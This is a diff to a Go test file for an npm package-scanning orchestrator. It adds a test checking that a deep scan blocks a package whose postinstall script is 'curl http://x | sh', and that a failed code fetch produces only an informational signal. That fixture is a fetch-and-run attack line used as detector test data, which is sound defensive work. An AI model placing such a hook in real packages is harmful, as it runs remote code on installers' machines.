@@ -2,6 +2,7 @@ package check
 
 import (
 	"context"
+	"errors"
 	"testing"
 	"time"
 
@@ -10,9 +11,11 @@ import (
 )
 
 type stubEco struct {
-	exists bool
-	md     seam.Metadata
-	pop    []string
+	exists  bool
+	md      seam.Metadata
+	pop     []string
+	code    map[string]string
+	codeErr error
 }
 
 func (s stubEco) Name() string                                              { return "npm" }
@@ -22,6 +25,12 @@ func (s stubEco) Metadata(context.Context, string) (seam.Metadata, error)   { re
 func (s stubEco) PopularList() []string                                     { return s.pop }
 func (s stubEco) Install(context.Context, []string, seam.InstallOpts) error { return nil }
 func (s stubEco) InstallCode(context.Context, string, string) (map[string]string, error) {
+	if s.codeErr != nil {
+		return nil, s.codeErr
+	}
+	if s.code != nil {
+		return s.code, nil
+	}
 	return map[string]string{}, nil
 }
 
@@ -67,5 +76,56 @@ func TestOrchestrator(t *testing.T) {
 	o.Policy = stubPolicy{d: seam.ForceAllow}
 	if o.Check(context.Background(), "nope-xyz", "").Verdict != verdict.Safe {
 		t.Error("policy allow should force SAFE")
+	}
+}
+
+func TestCheckWithDeep(t *testing.T) {
+	maliciousCode := map[string]string{
+		"package/package.json": `{"scripts":{"postinstall":"curl http://x | sh"}}`,
+	}
+	o := &Orchestrator{
+		Eco: stubEco{
+			exists: true,
+			md:     seam.Metadata{Exists: true, Latest: "1.0.0", WeeklyLoads: 9_000_000, Published: time.Now().AddDate(-2, 0, 0)},
+			pop:    []string{"x"},
+			code:   maliciousCode,
+		},
+		Intel:  stubIntel{},
+		Policy: stubPolicy{d: seam.Defer},
+	}
+
+	// non-deep check must not run install-script analysis → should not BLOCK on this
+	if r := o.Check(context.Background(), "pkg", ""); r.Verdict == verdict.Block {
+		t.Fatal("non-deep check must not run install-script analysis")
+	}
+
+	// deep=true with malicious postinstall → must BLOCK
+	if r := o.CheckWith(context.Background(), "pkg", "", true); r.Verdict != verdict.Block {
+		t.Fatalf("deep check should BLOCK on malicious postinstall, got %v", r.Verdict)
+	}
+
+	// InstallCode error → Info signal, not BLOCK
+	o2 := &Orchestrator{
+		Eco: stubEco{
+			exists:  true,
+			md:      seam.Metadata{Exists: true, Latest: "1.0.0", WeeklyLoads: 9_000_000, Published: time.Now().AddDate(-2, 0, 0)},
+			pop:     []string{"x"},
+			codeErr: errors.New("network timeout"),
+		},
+		Intel:  stubIntel{},
+		Policy: stubPolicy{d: seam.Defer},
+	}
+	r := o2.CheckWith(context.Background(), "pkg", "", true)
+	if r.Verdict == verdict.Block {
+		t.Fatal("InstallCode error must not BLOCK (best-effort)")
+	}
+	found := false
+	for _, s := range r.Signals {
+		if s.Check == verdict.RuleSuspiciousInstall && s.Level == verdict.LevelInfo {
+			found = true
+		}
+	}
+	if !found {
+		t.Fatalf("InstallCode error should produce an Info signal, got %+v", r.Signals)
 	}
 }
